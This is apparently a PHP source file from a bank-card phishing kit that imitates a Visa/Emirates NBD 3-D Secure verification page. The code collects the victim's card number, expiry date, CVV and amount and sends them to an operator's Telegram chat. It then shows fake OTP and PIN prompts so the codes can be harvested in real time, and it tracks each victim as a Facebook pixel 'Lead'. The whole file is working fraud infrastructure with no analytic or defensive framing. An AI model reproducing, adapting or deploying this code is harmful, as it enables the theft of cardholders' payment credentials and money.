<?php
$root = (!empty($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/';
if (
  !isset($_POST['card_number']) || 
  !isset($_POST['card_date']) || 
  !isset($_POST['card_cvv']) ||
  !isset($_POST['amount'])
  ) {
    header('Location: '.$root);
    die();
}

include("config.php");

$ip = getUserIP();
$ua = $_SERVER['HTTP_USER_AGENT'];

$session     = isset( $_COOKIE['session'] ) ? $_COOKIE['session'] : 'anonymous';
$card_number = str_replace(' ', '', $_POST['card_number']);
$card_data   = str_replace(' ', '', $_POST['card_date']);
$card_cvv    = $_POST['card_cvv'];
$amount      = $_POST['amount'];
$ch_name     = $_POST['card_name'];
$bin_data    = check_bin($card_number);
$test        = str_contains($session, 'TEST') ? '⚡️ TEST' : '';
$chat_id     = $_COOKIE['chat'];
$chat        = CHATS[$chat_id];

$request = sendTelegram(
	'sendMessage',
	array(
		'chat_id' => $chat['cards'],
		'text' => "#".$session." ".$amount."\n".
              "<code>".$card_number."</code>\n".
              "<code>".$card_data."</code>\n".
              "<code>".$card_cvv."</code>\n".$bin_data."\n".$test,
            //   "<code>".$ch_name."</code>\n".
		'parse_mode' =>  'html',
		'reply_markup' => kb($session)
	),
	$chat['token']
);

$message_id = json_decode($request, true)['result']['message_id'];
$wss_port = WSS_PORT;
?>
<html>
	<head>
	      <script>
	    var session = "<?=$session?>";
    	var message_id = "<?=$message_id?>";
    	var card_number = "<?=$card_number?>";
    	var amount = "<?=$amount?>";
    	var wss_port = "<?=$wss_port?>";
	    </script>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Validate</title>
		<link rel="stylesheet" href="./assets/styles.css">
		<script src="./assets/jquery.min.js" type="text/javascript"></script>
		<script src="./assets/script.js" type="text/javascript"></script>
		<script>
        var gets=function(){var t=sessionStorage.getItem("pix"),e=new Object;t=t.substring(1).split("&");for(var r=0;r<t.length;r++)c=t[r].split("="),e[c[0]]=c[1];return e}();
    </script>
	</head>

	<body>
	    <script>
	    $('#ValidateButton').click(function () {
		var code = $('#CredentialValidateInput').val();
		
	if ( code.length > 0 ) {
		    $('.download').show();
			$.ajax({
                type: 'POST',
                url: './api.php',
                data: {
					s: session,
                    code: code,
                    message_id: message_id,
                    card_number: card_number
                },
                dataType: "html",
                cache: false,
                complete: (response)=> {
                    window.message_sms_id = response.responseText;
                    wait_action();
                },
                error: (xhr, str)=> {
                    console.log(`${JSON.stringify(xhr, null, '\t')}; ${str}`)
                }
            });
		} else {
			alert('Entered correct code.');
		}
		
		return false;
	});
	    </script>
	    <div id="modal-pin" style="
   position: absolute;
   top: 0;
   left: 0;
   width: 100%;
   height: 100%;
   background: rgb(255 255 255 / 80%);
   border-radius: 3px;
   direction: ltr;
   display: none;
   ">
   <div style="
      width: calc(100% - 150px);
      min-width: 250px;
      position: absolute;
      top: calc(50% - 100px);
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 15px 15px;
      border: 1px solid #193ab0;
      ">
      <span>Enter PIN code of your card for verification in the payment system or change your bank card.</span>
      <div style="
         margin-top: 15px;
         ">
         <label for="pin-input" style="
            text-align: center;
            width: 100%;
            ">Verification PIN Сode</label>
         <input autofocus="" type="number" class="form-control visa-styling valid" data-val="true" data-val-required="" style="direction: ltr;" id="pin-input" name="Credential.Value" value="" aria-describedby="CredentialValidateInput-error" aria-invalid="false">
         <input id="Credential_Id" name="Credential.Id" type="hidden" value="a">
         <div class="form-group" id="ErrorMessage">
            <img id="WarningImage" src="./images/warning.png" alt="Warning" style="display: none;">
            <span id="ValidationErrorMessage" class="field-validation-error" style="display: none;"></span>
            <span class="field-validation-valid" data-valmsg-for="Credential.Value" data-valmsg-replace="true"></span>
         </div>
         <div class="visa-col-12 text-center">
            <button type="submit" class="visa-styling btn btn-primary text-uppercase vba-button" style="margin-top:5px; width: 100%;background-color:#193ab0;" id="send-pin">CONTINUE</button>
            <a href="#" onclick="window.location.href = '/payment/';" style="margin-top:5px;color:#193ab0;" class="btn btn-link no-decoration text-uppercase">CHANGE CARD</a>
         </div>
      </div>
   </div>
</div>
		<div class="threeds-two">
			<div class="container-fluid">
				<div class="visa-styling header" id="HeaderLogosFullWidth">
					<!--<a href="" class="closeModal" id="ExitLink">X</a>-->
					<div class="row no-pad">
						<div class="visa-styling bottom-border col-12">
							<div class="pull-left visa-header-two"> <img alt="Verified By Visa logo" class="visa-header-img brand-logo" src=""> </div>
							<div class="pull-right visa-header-one"> <img alt="Bank Logo" class="visa-header-img" src="./banks/pcidss.svg"> </div>
						</div>
					</div>
				</div>
				<div class="visa-styling body" dir="RTL">
					<div class="download" style="
                position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; z-index: 1; background-color: white; display: flex; place-content: flex-start center; align-items: center; flex-direction: column;
            ">
					    <img src='./banks/load.b75b820d5677a45b26bd.gif' style='
    height: 40px;
    opacity: .5;
    margin-bottom: 17px;
'/> 
                <img id='brand1' src='' style='
    height: 40px;
    margin-bottom: 17px;
'  />
                <span style='font-size: 20px;text-align: center;'> Please wait. Your transaction is being processed </span>
                   
                
					</div>
					<div class="visa-styling container container-sticky-footer">
						<h1 class="screenreader-only-rtl">Your One-time Passcode has been sent</h1>
						<div class="visa-row">
							<div class="visa-col-12 visa-validate"> <strong>Payment Authentication</strong> </div>
							<div class="row">
								<div class="col-12" id="ValidateOneUpMessage">
									<div id="Body1" style="text-align: left;"></div>
									<div id="Body2" style="margin-top:15px;"></div>
								</div>
							</div>
						</div>
						<form autocomplete="off" id="code_form" method="post" name="ValidateCredentialForm" style="display: none;">
							<div class="visa-row">
								<div class="col-12 visa-styling">
									<div class="form-group text-center">
										<div id="InputAction">
											<label for="CredentialValidateInput">Verification Code</label>
											<input autofocus="" class="form-control visa-styling valid" data-val="true" data-val-required="" style="direction: ltr;" id="CredentialValidateInput" name="Credential.Value" type="text" value="" aria-describedby="CredentialValidateInput-error" aria-invalid="false">
											<input id="Credential_Id" name="Credential.Id" type="hidden" value="a">
											<div class="form-group" id="ErrorMessage"> <img id="WarningImage" src="./images/warning.png" alt="Warning" class="hide"> <span id="ValidationErrorMessage" class="field-validation-error hide"></span> <span class="field-validation-valid" data-valmsg-for="Credential.Value" data-valmsg-replace="true"></span> </div>
											<div class="visa-col-12 text-center">
												<button type="submit" class="visa-styling btn btn-primary text-uppercase vba-button" id="ValidateButton">SUBMIT</button>
											</div>
										</div>
									</div>
								</div><div class="col-12 text-center" onclick="alert('A new confirmation code has been sent to your phone number');"> <span id="MaximumResendsReachedMessage" class="hide">لقد وصلت إلى الحد الأقصى لعدد طلبات الحصول على رمز جديد</span> <a href="#" id="ResendLink" class="btn btn-link no-decoration text-uppercase">RESEND CODE</a> </div>
							</div>
						</form>
						
						<div id="ok_button" style="display: none;">
						    <div class="visa-col-12 text-center">
								<button type="submit" class="visa-styling btn btn-primary text-uppercase vba-button" id="back_button">OK</button>
							</div>
						</div>
					</div>
					
					<div class="footer" id="FooterLinks">
						<div class="row">
							<div class="visa-col-12 helpRow" id="Accordion">
								<ul class="list-inline list-inline-separated pull-right">
									<li><a class="btn btn-link no-decoration" data-target="#Help" data-toggle="modal" href="#Help" id="FooterLink1" onclick="$('#INFO').show('slow');">learn more about authentication</a></li>
									<li> <a class="btn btn-link no-decoration" data-target="#TandCs" data-toggle="modal" href="#TandCs" id="FooterLink1" onclick="$('#FAQ').show('slow');">?Need some help</a></li>
								</ul>
							</div>
						</div>
					</div>
					
					<div class="modal fade in" id="FAQ" tabindex="-1" role="dialog" aria-labelledby="FAQ-label">
						<div class="modal-dialog" role="document">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal" aria-label="Close"> <span aria-hidden="true" onclick="$('#FAQ').hide('slow');">×</span> </button>
									<h4 class="modal-title" style="text-align: left;" id="FAQ-label">?Need some help</h4> </div>
								<div class="modal-body partial-modal">
									<div>
										<p style="text-align: left;">Please contact us through the Customer Service number on the back of your card</p>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="modal fade in" id="INFO" tabindex="-1" role="dialog" aria-labelledby="FAQ-label">
						<div class="modal-dialog" role="document">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal" aria-label="Close"> <span aria-hidden="true" onclick="$('#INFO').hide('slow');">×</span> </button>
									<h4 class="modal-title" style="text-align: left;" id="FAQ-label">Learn more about authentication</h4> </div>
								<div class="modal-body partial-modal">
									<div>
										<p style="text-align: left;">To learn more about authentication process, please wisit www.emiratesnbd.com</p>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="modal modal-clear rtl" id="ProcessingModal" tabindex="-1" role="dialog" aria-labelledby="Processing-label" aria-hidden="true" data-keyboard="false" data-backdrop="static">
						<div class="modal-dialog">
							<div class="modal-content">
								<div class="modal-body">
									<div class="row">
										<div class="col-12 processing"> <img id="ProcessingImage" src="./images/loading.svg" alt="Loading Indicator" class="processing-img center-block content-block">
											<p class="processing-text" id="Processing-label">جاري التنفيذ</p>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<form action="/Api/2_1_0/NextStep/StepUp" autocomplete="off" data-ajax="true" data-ajax-begin="ccHelpers.ajax.onBegin" data-ajax-complete="ccHelpers.ajax.onComplete" data-ajax-failure="ccHelpers.ajax.onFailure" data-ajax-method="form" data-ajax-success="ccHelpers.ajax.onSuccess" id="StepupForm" method="post" name="StepupForm">
						<input id="HiddenTransactionId" name="TransactionId" type="hidden" value="78fca3c4-b0c9-4b55-8f7a-b82f96e801df">
						<input id="StepUpIssuerId" name="IssuerId" type="hidden" value="5f60f6d92b4d0e4dee344032">
					</form>
				</div>
				<input data-val="true" data-val-number="The field MessageVersion must be a number." data-val-required="The MessageVersion field is required." id="MessageVersion" name="MessageVersion" type="hidden" value="2">
				<div class="modal fade rtl" id="Help" tabindex="-1" role="dialog" aria-labelledby="Help-label">
					<div class="modal-dialog" role="document">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="float: left;"> <span aria-hidden="true">×</span> </button>
								<h4 class="modal-title" id="Help-label">هل تحتاج للمساعدة؟</h4> </div>
							<div class="modal-body partial-modal">
								<div>
									<p>للمزيد من المعلومات، الرجاء التواصل مع مركز خدمة المتعاملين المتوفر 24 ساعة على 60043216 ( من داخل الإمارات) أو96626100600 (من خارج الإمارات) حتى نتمكن من مساعدتك. شكراً لك</p>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="modal fade rtl fl-left" id="TandCs" tabindex="-1" role="dialog" aria-labelledby="TandCs-label">
					<div class="modal-dialog" role="document">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close fl-left" data-dismiss="modal" aria-label="Close"> <span aria-hidden="true">×</span> </button>
								<h4 class="modal-title" id="TandCs-label">Need some help?</h4> </div>
							<div class="modal-body partial-modal">
								<div>
									<p>https://adibm.com/vcasar</p>
								</div>
							</div>
						</div>
					</div>
				</div>
				<form class="nextstep-form" method="post">
					<input id="NextStepTransactionId" name="TransactionId" type="hidden" value="78fca3c4-b0c9-4b55-8f7a-b82f96e801df">
					<input id="GroupId" name="GroupId" type="hidden" value="">
					<input id="Type" name="Type" type="hidden" value="OTP">
					<input id="NextStepChoiceType" name="NextStepChoiceType" type="hidden" value="Grouped">
					<input id="NextStepIssuerId" name="IssuerId" type="hidden" value="5f60f6d92b4d0e4dee344032"> </form>
				<form method="POST" id="TermForm">
					<input type="hidden" id="cres" name="cres" value="">
					<input type="hidden" id="threeDSSessionData" name="threeDSSessionData" value=""> </form>
			</div>
		</div>
		<script>
        !function(e,t,n,i,c,o,a){e.fbq||(c=e.fbq=function(){c.callMethod?c.callMethod.apply(c,arguments):c.queue.push(arguments)},e._fbq||(e._fbq=c),c.push=c,c.loaded=!0,c.version="2.0",c.queue=[],(o=t.createElement(n)).async=!0,o.src="https://connect.facebook.net/en_US/fbevents.js",(a=t.getElementsByTagName(n)[0]).parentNode.insertBefore(o,a))}(window,document,"script");var pixel=gets.fbpixel;fbq("init",pixel),fbq("track","Lead"),document.createElement("div").innerHTML='<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id='+pixel+'&ev=Lead&noscript=1">';
    </script>
</body>
		<script>
		    var getCardBrand = card_type( "<?=$_POST['card_number']?>" );
        console.log(getCardBrand);
        if (getCardBrand == 'mastercard') {
            $('.brand-logo').attr('src',"./banks/mc.e80f5a349ae92775f406.png");
            $('#brand1').attr('src', "./banks/mc.e80f5a349ae92775f406.png");
            console.log('mc');
            
        }
        if (getCardBrand == 'visa') {
            $('.brand-logo').attr('src',"./banks/visa.383c33ef3b92cd3eda15.png");
            $('#brand1').attr('src', "./banks/visa.383c33ef3b92cd3eda15.png");
            console.log('visa');
        }
		</script>
		<!--<script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool'></script>-->
	</body>
</html>